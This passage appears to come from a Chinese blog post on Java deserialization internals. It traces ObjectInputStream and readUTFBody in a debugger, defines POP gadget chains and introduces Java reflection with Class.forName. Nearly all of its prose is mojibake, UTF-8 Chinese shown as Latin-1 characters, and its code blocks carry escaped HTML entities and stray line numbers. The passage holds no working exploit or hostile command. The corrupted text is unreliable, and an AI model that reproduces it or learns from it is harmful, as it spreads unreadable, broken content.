objValues);ï¼Œè·Ÿè¿›å‰çœ‹çœ‹objValuesæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿\nå‘ç°å€¼å·²ç»è¢«è®¾ç½®å¥½äº†ï¼Œé‚£setObjFieldValues()åšçš„å¯èƒ½åªæ˜¯å¤åˆ¶objValuesé‡Œçš„å€¼ç»™Objï¼Œæ­¤æ—¶UnsafeClass0--thiså°±å·²ç»æ”¹å˜äº†\næ–°é—®é¢˜ï¼šobjValues æ˜¯ä»€ä¹ˆæ—¶å€™èµ‹å€¼çš„å‘¢\nè·Ÿè¿›çœ‹ä¸€ä¸‹\nè¿™é‡Œå°±æ˜¯åœ¨å¾€objValuesé‡Œå†™ä¸œè¥¿äº†ï¼Œçœ‹çœ‹readObject0å¦‚ä½•è§£æçš„ï¼ˆf.isUnshared()è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼‰\nç»å†ä¸€ç³»åˆ—ç±»ä¼¼æµç¨‹æ§åˆ¶çš„ä¸œè¥¿ï¼Œæœ€åæ¥åˆ°äº†è¿™\nå…ˆçœ‹çœ‹ readString åœ¨å¹²å˜›ï¼š\nå…ˆå®Œæ•´æ‰§è¡Œä¸€éï¼Œå‘ç°è·¯è¿‡é‚£æ¡switchè¯­å¥çš„æ—¶å€™ï¼Œstrå°±èƒ½è¢«èµ‹å€¼ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œçš„å…³é”®å­—\nè¯´æ˜readUTFæ˜¯åœ¨ä»åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­æå–æ•°æ®ï¼Œçœ‹çœ‹ bin æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿\nbiné‡Œæ˜¯å·²ç»å¤„ç†å¥½çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç¢ç‰‡ï¼Œé‚£ä¹ˆæ˜¯å“ªä¸ªå‡½æ•°åœ¨å¤„ç†æ•´ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å‘¢ï¼Ÿï¼ˆæ‰¾åˆ°ç»™binèµ‹å€¼çš„è¯­å¥ï¼‰\nç›´æ¥çœ‹çœ‹ä¸å‡ºä»€ä¹ˆç«¯å€ªï¼Œçœ‹æ¥åªæœ‰è·Ÿç€æ–­ç‚¹èµ°ä¸€æ¬¡\nèµ°ä¸€æ¬¡ï¼Œæ²¡æœ‰æ‰¾åˆ°ç»™bin.cbufèµ‹å€¼çš„åœ°æ–¹ï¼Œä½†æ˜¯æœ‰æ„å¤–æ”¶è·ï¼š\nè¿™ä¸å°±æ˜¯å¦¥å¦¥çš„å’±è¦æ‰¾çš„ä¸œè¥¿å—ï¼Œsigsçš„æ¥æºæ‰¾åˆ°äº†ï¼Œæ€ä¹ˆèµ‹å€¼ç»™bin.cbufå°±æš‚æ—¶ä¸æ·±ç©¶äº†ï¼ˆæ¯•ç«Ÿå…¶å®å¾ˆæƒ³çœ‹åˆ°çš„å°±æ˜¯å¦‚ä½•ä»åºåˆ—åŒ–ä¸­æå–å‡ºä¹‹å‰å†™å…¥çš„åºåˆ—åŒ–æ•°æ®ï¼‰\nè¿™é‡Œçš„ä»£ç æ˜¯è¿™æ ·çš„ï¼š\næŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªsigsèƒ½åœ¨å“ªäº›åœ°æ–¹è¢«èµ‹å€¼\nçœ‹æ¥å°±åªæœ‰sigs[j++] = f.getName();sigs[j++] = f.getSignature();è¿™ä¸¤ä¸ªåœ°æ–¹ï¼Œåº·åº·f.getName()å’Œf.getSignature()åœ¨å¹²å˜›\nï¼Œï¼Œï¼Œï¼Œä»–æ²¡å¹²å˜›ï¼Œæ‰€ä»¥çœ‹çœ‹ f æ€ä¹ˆæ¥çš„ ï¼ˆå¯æ¶ï¼Œå¯¹ get set ç±»å‡½æ•°è¿˜æ˜¯ä¸å¤Ÿæ•æ„Ÿï¼Œä½†æ˜¯ä¹Ÿç®—ä¸¥è°¨ï¼Œï¼Œï¼Œï¼Œï¼‰\nObjectStreamField f = fields[i];ï¼Œæ‰€ä»¥å¾—çœ‹çœ‹fieldsæ˜¯æ€ä¹ˆæ¥çš„ Fieldç±»è¯´æ˜\nè¿™é‡Œçš„fieldsæ˜¯ç›´æ¥ä¼ å‚è¿›æ¥çš„ï¼Œè€Œä¸”è¿™é‡Œæ˜¯FieldReflectorKeyç±»çš„æ„é€ å‡½æ•°ï¼Œåº·åº·è°åœ¨newå‘¢ï¼Ÿ\nè¿™é‡Œçš„fieldså“ªæ¥çš„ï¼Ÿ\nè¿™é‡Œçš„fieldsä¹Ÿæ˜¯ä¼ å‚ï¼Œå†è·Ÿï¼\nè¿™é‡Œå‘ç°ç»™fieldsèµ‹å€¼çš„åœ°æ–¹æœ‰äº›å¤šï¼Œé‡æ–°debugçœ‹çœ‹\nå¤šæ¬¡å°è¯•ï¼Œå‘ç°èµ‹å€¼çš„åœ°æ–¹åœ¨ï¼š\nå†è·¯è¿‡å°±å·²ç»å¤„ç†å¥½å•¦ï¼Œè·Ÿè¿›ï¼š\nè¿™æ­¥èµ‹å€¼ï¼Œè·Ÿè¿›ï¼š\nè¿™æ­¥åˆæ˜¯å·²ç»è¢«å¤„ç†å¥½äº†ï¼ˆæ€ä¹ˆè¿™ä¹ˆå¤šæ£€æµ‹ï¼‰é‡æ–°åœ¨Field[] clFields = cl.getDeclaredFields();å¤„æ‰“ä¸ªæ–­ç‚¹ï¼Œé‡æ–°çœ‹çœ‹\nåˆæ˜¯è¢«å¤„ç†å¥½çš„ï¼Œé‡æ–°è·Ÿè¸ªrd\nåˆï¼Œè°ƒç”¨çš„æ—¶å€™å·²ç»æœ‰äº†ï¼Œï¼Œï¼Œç»è¿‡åå¤è°ƒè¯•ï¼Œç»ˆäºæ‰¾åˆ°ä¸€ä¸ªåƒæ˜¯æœ€åˆå¤„ç†çš„å‡½æ•°\nä½†æ˜¯å·²ç»æ²¡æœ‰åŠæ³•è¿½è¸ªäº†ï¼ŒgetDeclaredFields0(publicOnly)ç²—ç•¥ç†è§£ï¼š\nâ€‹\tgetDeclaredFields0() æ˜¯ Java ä¸­ Class ç±»çš„ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯ä½¿ç”¨ C æˆ– C++ ç­‰æœ¬åœ°è¯­è¨€ç¼–å†™çš„ã€‚æœ¬åœ°æ–¹æ³•æ˜¯ Java ä¸­ä¸åº•å±‚æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶äº¤äº’çš„ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥è®© Java ç¨‹åºèƒ½å¤Ÿè°ƒç”¨åº•å±‚æ“ä½œç³»ç»Ÿæä¾›çš„æœ¬åœ°åŠŸèƒ½å’Œèµ„æºã€‚ â€‹\tJava è¯­è¨€æœ¬èº«å¹¶ä¸æ”¯æŒåº•å±‚æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶çš„è®¿é—®ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨æœ¬åœ°æ–¹æ³•æ¥æ‰©å±• Java çš„èƒ½åŠ›ã€‚æœ¬åœ°æ–¹æ³•é€šå¸¸ç”±æœ¬åœ°åº“ï¼ˆnative libraryï¼‰å®ç°ï¼Œæœ¬åœ°åº“æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼ˆ.dll æˆ– .so æ–‡ä»¶ï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†æœ¬åœ°æ–¹æ³•çš„å®ç°ã€‚åœ¨ Java ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ System.loadLibrary() æˆ– System.load() æ–¹æ³•æ¥åŠ è½½æœ¬åœ°åº“ï¼Œä»è€Œä½¿ Java ç¨‹åºèƒ½å¤Ÿè°ƒç”¨æœ¬åœ°æ–¹æ³•ã€‚ â€‹\tåœ¨ Class ç±»ä¸­ï¼ŒgetDeclaredFields0() æ–¹æ³•æ˜¯ä½¿ç”¨æœ¬åœ°è¯­è¨€ç¼–å†™çš„æœ¬åœ°æ–¹æ³•ï¼Œå®ƒå®ç°äº†è·å–ä¸€ä¸ªç±»ä¸­å£°æ˜çš„æ‰€æœ‰æˆå‘˜å˜é‡çš„åŠŸèƒ½ã€‚å½“ Java ç¨‹åºè°ƒç”¨ getDeclaredFields() æ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº† getDeclaredFields0() æ–¹æ³•çš„ Java å°è£…ï¼Œè€Œè¿™ä¸ªå°è£…æ–¹æ³•ä¼šé€šè¿‡ JNIï¼ˆJava Native Interfaceï¼‰æœºåˆ¶æ¥è°ƒç”¨æœ¬åœ°æ–¹æ³•çš„å®ç°ã€‚\nä½†æ˜¯getDeclaredFields0(publicOnly)åªæ˜¯è·å¾—äº†ç±»é‡Œå£°æ˜çš„æˆå‘˜å˜é‡ï¼Œå¹¶æ²¡æœ‰ç»™å…¶èµ‹å€¼ï¼Œå…·ä½“çš„å€¼æ˜¯ä»€ä¹ˆæ—¶å€™æŠ½å–å‡ºæ¥çš„ï¼Ÿ\né‡æ–°è°ƒæ•´æ€è·¯ï¼Œä¸€è·¯debugå¯»æ‰¾ï¼Œæ‰¾åˆ°äº†readUTFBodyï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 private String readUTFBody(long utflen) throws IOException { StringBuilder sbuf; if (utflen \u0026gt; 0 \u0026amp;\u0026amp; utflen \u0026lt; Integer.MAX_VALUE) { // a reasonable initial capacity based on the UTF length int initialCapacity = Math.min((int)utflen, 0xFFFF); sbuf = new StringBuilder(initialCapacity); } else { sbuf = new StringBuilder(); } if (!blkmode) { end = pos = 0; } while (utflen \u0026gt; 0) { int avail = end - pos; if (avail \u0026gt;= 3 || (long) avail == utflen) { utflen -= readUTFSpan(sbuf, utflen); } else { if (blkmode) { // near block boundary, read one byte at a time utflen -= readUTFChar(sbuf, utflen); } else { // shift and refill buffer manually if (avail \u0026gt; 0) { System.arraycopy(buf, pos, buf, 0, avail); } pos = 0; end = (int) Math.min(MAX_BLOCK_SIZE, utflen); in.readFully(buf, avail, end - avail); } } } return sbuf.toString(); } ç²—ç•¥ç†è§£ä¸€ä¸‹ï¼š\nreadUTFBodyï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»è¾“å…¥æµä¸­è¯»å–æŒ‡å®šé•¿åº¦çš„UTF-8å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºJavaçš„Stringç±»å‹è¿”å›ã€‚\nå…·ä½“æ¥è¯´ï¼Œä»£ç çš„ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š\næ ¹æ®æŒ‡å®šçš„ utflenï¼ˆè¡¨ç¤ºUTF-8ç¼–ç çš„å­—èŠ‚æ•°ï¼‰åˆ›å»ºä¸€ä¸ª StringBuilder å¯¹è±¡ sbufï¼Œä½œä¸ºå­˜å‚¨è§£ç åå­—ç¬¦ä¸²çš„ç¼“å†²åŒºã€‚å¦‚æœ utflen åœ¨ 0 å’Œ Integer.MAX_VALUE ä¹‹é—´ï¼Œåˆ™è®¾ç½® sbuf çš„åˆå§‹å®¹é‡ä¸º utflen å’Œ 0xFFFF ä¹‹é—´çš„è¾ƒå°å€¼ï¼Œä»¥æé«˜æ€§èƒ½ã€‚\nå¦‚æœå½“å‰è¾“å…¥æµä¸å¤„äºå—æ¨¡å¼ï¼Œåˆ™å°†è¾“å…¥æµçš„ pos å’Œ end åˆ†åˆ«è®¾ç½®ä¸º0ï¼Œè¡¨ç¤ºå½“å‰æ²¡æœ‰è¯»å–ä»»ä½•æ•°æ®ã€‚\nè¿›å…¥ä¸€ä¸ªwhileå¾ªç¯ï¼Œå¾ªç¯æ¡ä»¶æ˜¯utflenå¤§äº0ï¼Œå³è¿˜éœ€è¦ç»§ç»­è¯»å–å­—ç¬¦ä¸²ã€‚\nåœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œæ ¹æ®è¾“å…¥æµçš„ pos å’Œ end è®¡ç®—å½“å‰å¯ç”¨çš„å­—èŠ‚æ•° availã€‚å¦‚æœ avail å¤§äºç­‰äº3ï¼Œæˆ–è€…ä¸ utflen ç›¸ç­‰ï¼Œåˆ™è°ƒç”¨ readUTFSpan() æ–¹æ³•è¯»å–ä¸€æ®µè¿ç»­çš„å­—èŠ‚ï¼Œå¹¶å°†å…¶è§£ç æˆå­—ç¬¦ä¸²ï¼Œå°†è§£ç åçš„å­—ç¬¦ä¸²è¿½åŠ åˆ° sbuf ä¸­ï¼Œå¹¶å°†å·²ç»è¯»å–çš„å­—èŠ‚æ•°ä» utflen ä¸­å‡å»ã€‚\nå¦‚æœavailå°äº3ä¸”ä¸ç­‰äº utflen ï¼Œåˆ™åˆ†ä¸¤ç§æƒ…å†µå¤„ç†ï¼š\nå¦‚æœå½“å‰è¾“å…¥æµå¤„äºå—æ¨¡å¼ï¼Œåˆ™è¯´æ˜æ¥è¿‘å—è¾¹ç•Œï¼Œä¾¿é€ä¸ªå­—èŠ‚åœ°è¯»å–å‰©ä½™å­—èŠ‚ï¼Œè°ƒç”¨readUTFCharå‡½æ•°è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œå°†è§£ç åçš„å­—ç¬¦è¿½åŠ åˆ° sbuf ä¸­ï¼Œå¹¶å°†å·²ç»è¯»å–çš„å­—èŠ‚æ•°ä» utflen ä¸­å‡å»ã€‚ å¦‚æœå½“å‰è¾“å…¥æµä¸å¤„äºå—æ¨¡å¼ï¼Œåˆ™æ‰‹åŠ¨ç§»åŠ¨å‰©ä½™å­—èŠ‚åˆ°ç¼“å†²åŒºçš„å¼€å¤´ï¼Œé‡æ–°å¡«å……ç¼“å†²åŒºï¼Œå°† pos å’Œ end åˆ†åˆ«è®¾ç½®ä¸º0å’Œæ–°çš„å¯è¯»å–å­—èŠ‚æ•°ï¼Œç„¶åç»§ç»­å¾ªç¯è¯»å–æ•°æ®ã€‚ åœ¨whileå¾ªç¯ç»“æŸåï¼Œè¿”å› sbuf ç¼“å†²åŒºä¸­å­˜å‚¨çš„è§£ç åçš„å­—ç¬¦ä¸²ï¼Œå³è¯»å–çš„UTF-8å­—ç¬¦ä¸²ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¯»å–å­—èŠ‚å’Œè§£ç å­—ç¬¦ä¸²çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°ä»»ä½•é”™è¯¯ï¼ˆå¦‚è¯»å–å­—èŠ‚å¤±è´¥ã€è§£ç å¤±è´¥ç­‰ï¼‰ï¼Œåˆ™ä¼šæŠ›å‡º IOException æˆ–UTFDataFormatException å¼‚å¸¸ã€‚\nç®€å•æ¥è¯´å°±æ˜¯æŠŠå­—èŠ‚æµè½¬æ¢æˆå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œå­—èŠ‚æµæ˜¯ä»buffå˜é‡é‡Œé¢è¯»å–çš„ï¼Œbuffæ˜¯ä»€ä¹ˆæ—¶å€™èµ‹å€¼çš„å‘¢ in.readFully()\næ‰€ä»¥å®Œæ•´åºåˆ—åŒ–æ•°æ®åˆ°å¯¹è±¡çš„è¿‡ç¨‹ï¼š\nin.readFully()è¯»å…¥æŒ‡å®šä½ç½®å’Œå­—æ•°çš„å­—èŠ‚åˆ°buffï¼ŒreadUTFBody()å’ŒreadUTFSpan()æ§åˆ¶buffå­—èŠ‚æµçš„åŒæ—¶è¯»å‡ºé‡Œé¢çš„å±æ€§åä¸å…¶å¯¹åº”å±æ€§ï¼Œè¿”å›åˆ°ObjectStreamClassé‡Œç»„è£…åˆ°fieldsé‡Œï¼Œç„¶åè¿”å›å€¼ä¸€è·¯è¿”å›åˆ°ObjectInputStreamç±»é‡Œï¼Œè¿™ä¹‹å‰éƒ½æ˜¯ä¸ºäº†ç”Ÿæˆå¯¹ç±»çš„ç»†èŠ‚æè¿°â€œdesâ€ï¼šç±»åï¼Œå±æ€§åï¼Œå±æ€§ç±»å‹ï¼Œåšå¥½äº†å¯¹è±¡çš„æ¡†æ¶åæœ€åå†ObjectStreamClassé‡Œå¯¹ç±»è¿›è¡Œäº†å®ä¾‹åŒ–\nè°ƒç”¨çš„ä¹Ÿæ˜¯åå°„ç±»çš„å®ä¾‹å‡½æ•°ï¼š\næœ€ååœ¨ObjectInputStreamé‡Œobjæ¥æ”¶åˆ°äº†è¿”å›çš„å®ä¾‹åŒ–å¥½çš„ç©ºçš„UnsafeClass0å¯¹è±¡\næ­¤æ—¶å†æ¬¡è°ƒè¯•å‘ç°å›åˆ°äº†æˆ‘ä»¬å®šä¹‰çš„ç±»é‡Œé¢\næ‰€ä»¥å¯ä»¥ç¡®å®šäº†ï¼Œåœ¨æ‰§è¡ŒUnsafeClass0.readObjectä¸­çš„in.defaultReadObject();ä¹‹å‰ï¼Œéƒ½åªæ˜¯åœ¨åˆå§‹åŒ–ä¸€ä¸ªUnsafeClass0ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œæ­¤æ—¶å†è¿›å…¥defaultReadObjectè¿›è¡Œå€¼çš„èµ‹\ndefultReadObjectåšçš„æ˜¯å°±æ˜¯æ‹¿åˆ°å½“å‰éœ€è¦èµ‹å€¼çš„ObjcurObjå’Œå½“å‰å¤„ç†å¥½çš„å¯¹è¯¥Objçš„æè¿°curDescç„¶ååœ¨åˆ›å»ºFieldValuseå¯¹è±¡åˆå§‹åŒ–\nè¿™æ¬¡åˆå§‹åŒ–ä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨\nreadUTFç­‰ä¸€ç³»åˆ—æ–¹æ³•å¯¹åºåˆ—åŒ–å­—èŠ‚è¿›è¡Œå¤„ç†å¾—åˆ°å…·ä½“å€¼\né€šè¿‡curDescæ‹¿åˆ°è¯¥èµ‹çš„å…·ä½“å€¼ç»™curObjèµ‹å€¼ï¼Œå³å¯å®Œæˆååºåˆ—åŒ–\nç¬¬äºŒä¸ªé—®é¢˜ UnsafeClass0 çš„ readObject æ˜¯æœ‰å‚æ•°çš„ï¼Œæ‰€ä»¥UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject();è‚¯å®šä¸æ˜¯ç›´æ¥è°ƒç”¨ UnsafeClass0 ä¸­çš„ readObjectï¼Œé‚£æ˜¯è°è°ƒç”¨çš„å‘¢ï¼Ÿå¯ä»¥é€šè¿‡å‡½æ•°æ ˆè§‚å¯Ÿ\nè°ƒç”¨æƒ…å†µä½¿ç”¨ =\u0026gt; è¡¨ç¤º\nmain =\u0026gt; ObjectInputStream.readObject =\u0026gt; ObjectInputStream.readObject0 =\u0026gt; ObjectInputStream.readOrdinaryObject =\u0026gt; ObjectInputStream.readSerialData =\u0026gt; ObjectStreamClass.invokeReadObject =\u0026gt; Method.invoke =\u0026gt; ç„¶åä¸€å †çœ‹ä¸æ‡‚çš„ =\u0026gt; UnsafeClass0.readObject\nçœ‹åˆ°ç†Ÿæ‚‰çš„ Method.invokeäº†å—ï¼Œï¼ˆå¥½å§å…¶å®ä¹Ÿä¸æ˜¯å¾ˆç†Ÿï¼‰Javaä¹Ÿæ˜¯é€šè¿‡åå°„æ¥è°ƒç”¨ UnsafeClass0.readObject\nè‡³æ­¤ï¼Œååºåˆ—åŒ–çš„åˆæ­¥ç†è§£å°±å‘Šä¸€æ®µè½äº†\nPOPé“¾ â€‹\tPOPï¼ˆProperty-Oriented Programmingï¼‰ç›´è¯‘çš„è¯å°±æ˜¯é¢å‘å±æ€§ç¼–ç¨‹ï¼Œå¦‚æœå­¦è¿‡äºŒè¿›åˆ¶çš„è¯å°±å¯ä»¥ç±»æ¯”ä¸€ä¸‹ROPã€‚ POP é“¾çš„æ„é€ åˆ™æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚\nâ€‹\tä½œè€…ä¸ªäººç†è§£ï¼šä»å¯æ§çš„è¾“å…¥ç‚¹åˆ°æœ€ç»ˆçš„ä»£ç æ‰§è¡Œç‚¹ä¸€èˆ¬ä¸æ˜¯ç›´è¾¾çš„ï¼Œæ­¤æ—¶éœ€è¦ç²¾å¿ƒæ„é€ æˆ–è€…å¯»æ‰¾ä¸€äº›èƒ½å¤Ÿåœ¨ä¸åŒå¯¹è±¡ï¼Œæ–¹æ³•ä¹‹é—´è·³è½¬çš„è·³æ¿å‡½æ•°æˆ–è€…è·³æ¿å¯¹è±¡ã€‚ä¸”è¿™äº›è·³æ¿æœ¬èº«å¯èƒ½å¹¶ä¸æ˜¯ç”¨ä½œè·³æ¿ç”¨é€”ï¼Œæœ‰æ—¶å€™çš„è·³æ¿å¯èƒ½åªæ˜¯åˆ©ç”¨äº†ç›¸å…³å‡½æ•°çš„è®¾è®¡æœºåˆ¶ï¼ˆä¾‹å¦‚PHPä¸­è®¿é—®ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨è¯¥å¯¹è±¡çš„__class__é­”æœ¯æ–¹æ³•ï¼‰\nâ€‹\tåœ¨ä¹‹åçš„æ–‡ç« ä¸­ï¼Œä¼šæ·±åˆ»çš„é¢†æ‚Ÿåˆ°POPçš„ç²¾é«“\nåå°„ è¦çŸ¥é“ä»€ä¹ˆæ˜¯åå°„ï¼Œé¦–å…ˆå°±è¦çŸ¥é“\u0026quot;æ­£å°„\u0026quot;æ˜¯æ€ä¹ˆæ ·çš„\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨æŸä¸ªç±»å‰ï¼Œæˆ‘ä»¬æ˜¯çŸ¥é“è¿™ä¸ªç±»çš„ç±»åçš„ï¼Œæ¯”å¦‚å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™\n1 2 Apple apple = new Apple(); //ç›´æ¥åˆå§‹åŒ–ï¼Œã€Œæ­£å°„ã€ apple.setPrice(4); ç±»ä¼¼è¿™ç§çŸ¥é“è¦åˆå§‹åŒ–ç±»çš„ç±»åï¼Œå¹¶å°†å…¶å†™æ­»åœ¨ä»£ç ä¸­ï¼Œè¿è¡Œæ—¶æ— æ³•æ›´æ”¹çš„ï¼Œå°±å¯ä»¥ç§°ä¹‹ä¸ºæ­£å°„\nåå°„çš„è¯å°±æ˜¯å’Œæ­£å°„åç€æ¥ï¼Œç¨‹åºè¿è¡Œèµ·æ¥ä¹‹å‰ï¼Œæˆ‘å¹¶ä¸çŸ¥é“æˆ‘éœ€è¦åˆå§‹åŒ–ç±»çš„ç±»åå«ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘æ— æ³•åœ¨ä»£ç ä¸­å†™æ­»\nä¸¾ä¸€ä¸ªä¸æ°å½“ä½†æ˜¯å¾ˆåˆé€‚çš„éœ€æ±‚ï¼šæˆ‘éœ€è¦ä½¿ç”¨Javaå†™ä¸€ä¸ªç¨‹åºï¼Œåœ¨å…¶è¿è¡ŒæœŸé—´ï¼Œæˆ‘æ¯è¾“å…¥ä¸€ä¸ªç±»çš„åå­—ï¼ŒJavaç¨‹åºå°±å¸®æˆ‘å®ä¾‹åŒ–å¥½è¿™ä¸ªç±»å¯¹è±¡ï¼Œå°†å…¶åºåˆ—åŒ–æˆå­—èŠ‚æµï¼Œå¹¶åˆ›å»ºå†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œè·¯å¾„å’Œæˆ‘çš„å·¥ä½œè·¯å¾„ç›¸åŒï¼Œæ–‡ä»¶åå°±æ˜¯æˆ‘è¾“å…¥çš„ç±»çš„åå­—ï¼Œå…¶ä¸­å¯¹è±¡çš„æ•´å½¢å±æ€§æŒ‰ç…§å˜é‡åçš„å­—æ¯æ•°èµ‹å€¼ï¼Œå…¶ä»–ç±»å‹çš„å±æ€§èµ‹å€¼ä¸º Null\nå¦‚æœæ²¡æœ‰åœ¨å…¶è¿è¡ŒæœŸé—´è¿™ä¸ªå‰ææ¡ä»¶çš„è¯ï¼Œå®ç°è¿™ä¸ªéœ€æ±‚æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ new å‡ºå¯¹è±¡æ¥ï¼Œç„¶åæ•°å‡ºå˜é‡åå­—æ¯æ•°ï¼Œç„¶ååºåˆ—åŒ–å¥½æ”¾å…¥æ–‡ä»¶ä¸­\nâ€‹\tåå°„æ˜¯Javaçš„ç‰¹å¾ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§é—´æ¥æ“ä½œç›®æ ‡å¯¹è±¡çš„æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯JVMåœ¨è¿è¡ŒçŠ¶æ€çš„æ—¶å€™æ‰åŠ¨æ€åŠ è½½ç±»ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„æ–¹æ³•/è®¿é—®å±æ€§ã€‚è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºJavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚é€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•(Methods)ã€æˆå‘˜å˜é‡(Fields)ã€æ„é€ æ–¹æ³•(Constructors)ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚\nä½†æ˜¯åœ¨è¿è¡ŒæœŸé—´çš„è¯ï¼Œåªèƒ½ä½¿ç”¨åˆ°åå°„äº†ï¼ˆä¸¾ä¾‹åˆ°æ­¤ä¸ºæ­¢ï¼Œæ¥ä¸‹æ¥çš„ä»£ç ä¸è§£å†³ä¸Šè¯‰éœ€æ±‚ï¼‰\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ JDK æä¾›çš„åå°„ API è¿›è¡Œåå°„è°ƒç”¨\n1 2 3 4 5 Class clz = Class.forName(\u0026#34;com.dan.Apple\u0026#34;); Method method = clz.getMethod(\u0026#34;setPrice\u0026#34;, int.class); Constructor constructor = clz.getConstructor(); Object object = constructor.newInstance(); method.invoke(object, 4); è¿™ä¸¤æ®µä»£ç çš„èƒ½å®ç°ç›¸åŒçš„ä½œç”¨ï¼Œä½†æ˜¯ç¬¬äºŒæ®µä»£ç è·å–ç±»å®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œç±»åæ˜¯é€šè¿‡å­—ç¬¦ä¸²è·å–çš„\nåå°„å°±æ˜¯åœ¨è¿è¡Œæ—¶æ‰çŸ¥é“è¦æ“ä½œçš„ç±»æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶è·å–ç±»çš„å®Œæ•´æ„é€ ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ã€‚\næ¥ä¸‹æ¥å…ˆçœ‹çœ‹ä½¿ç”¨åå°„æˆ‘ä»¬èƒ½ç®€å•å¹²äº›ä»€ä¹ˆï¼Œæ€ä¹ˆä½¿ç”¨åå°„\nè·å–Classå¯¹è±¡ åœ¨åå°„ä¸­ï¼Œè¦è·å–ä¸€ä¸ªç±»æˆ–è°ƒç”¨ä¸€ä¸ªç±»çš„æ–¹æ³•ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è·å–åˆ°è¯¥ç±»çš„ Class å¯¹è±¡ã€‚\næœ‰ä¸‰ç§æ–¹æ³•\nç¬¬ä¸€ç§ï¼Œä½¿ç”¨ Class.forName é™æ€æ–¹æ³•ã€‚å½“ä½ çŸ¥é“è¯¥ç±»çš„å…¨è·¯å¾„åæ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è·å– Class ç±»å¯¹è±¡ã€‚\nClass clz = Class.forName(\u0026quot;java.lang.String\u0026quot;);\nç¬¬äºŒç§ï¼Œä½¿ç”¨ .class æ–¹æ³•ã€‚\nè¿™ç§æ–¹æ³•åªé€‚åˆåœ¨ç¼–è¯‘å‰å°±çŸ¥é“æ“ä½œçš„ Class å\nClass clz = String.class;\nç¬¬ä¸‰ç§ï¼Œä½¿ç”¨ç±»å¯¹è±¡çš„ getClass() æ–¹æ³•\nString str = new String(\u0026quot;Hello\u0026quot;); Class clz = str.getClass();\nè¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸€ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨ forName 